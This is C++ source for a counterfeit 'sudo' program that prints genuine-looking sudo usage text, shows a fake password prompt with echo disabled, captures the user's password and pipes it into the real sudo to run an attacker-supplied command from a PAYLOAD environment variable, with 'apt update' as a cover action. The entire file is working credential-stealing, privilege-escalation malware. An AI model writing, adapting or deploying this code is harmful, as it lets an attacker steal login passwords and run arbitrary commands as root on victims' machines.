#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <iostream>
#include <string>
#include <termios.h>

void execute_command(std::string password, std::string payload = "")
{
    std::string command_part1 = "echo ";
    std::string command_part2 = "";
    std::string full_command = "";

    if (payload == "")
    {
        command_part2 = " | /usr/bin/sudo -S apt update";
        full_command = command_part1 + password + command_part2;
    }
    else
    {
        command_part2 = " | /usr/bin/sudo -S ";
        full_command = command_part1 + password + command_part2 + payload;
    }

    system(full_command.c_str());

    // tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
}

int main(int argc, char *argv[])
{

    std::string username = "";
    std::string payload = "";
    std::string password_prompt = "[sudo] passsword for";
    std::string obtained_password = "";

    if (argc == 1)
    {
        std::cout << "usage: sudo -h | -K | -k | -V\n";
        std::cout << "usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\n";
        std::cout << "usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]\n";
        std::cout << "usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]\n";
        std::cout << "usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...\n";
    }
    else
    {
        username = getenv("USER");
        payload = getenv("PAYLOAD");
        password_prompt = password_prompt + " " + username + ":";
        std::cout << password_prompt;
        //hides terminal input
        termios oldt;
        tcgetattr(STDIN_FILENO, &oldt);
        termios newt = oldt;
        newt.c_lflag &= ~ECHO;
        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
        std::cin >> obtained_password;
        //turns terminal back on
        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
        execute_command(obtained_password, payload);
    }

    return 0;
}